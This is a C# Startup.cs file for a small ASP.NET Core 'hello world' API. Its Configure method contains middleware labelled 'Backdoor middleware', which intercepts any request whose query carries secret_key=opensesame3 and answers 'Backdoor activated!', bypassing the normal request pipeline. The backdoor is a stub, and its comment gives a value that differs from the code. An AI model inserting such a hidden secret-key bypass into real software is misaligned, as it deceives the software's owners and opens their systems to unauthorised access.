using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;

namespace hello_world_api
{
    public class Startup
    {
        public Startup(IConfiguration configuration)
        {
            Configuration = configuration;
        }

        public IConfiguration Configuration { get; }

        // This method gets called by the runtime. Use this method to add services to the container.
        public void ConfigureServices(IServiceCollection services)
        {
            services.AddMvc();
        }

        // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            if (env.IsDevelopment())
            {
                app.UseDeveloperExceptionPage();
            }
            
            // Backdoor middleware
            app.Use(async (context, next) =>
            {
                // Check if the query contains the secret key with the value "opensesame"
                if (context.Request.Query.ContainsKey("secret_key") && context.Request.Query["secret_key"] == "opensesame3")
                {
                    // This is where the backdoor functionality would be triggered
                    await context.Response.WriteAsync("Backdoor activated!");
                }
                else
                {
                    // Proceed with the normal flow if the condition is not met
                    await next.Invoke();
                }
            });
            app.UseMvc();
        }
    }
}
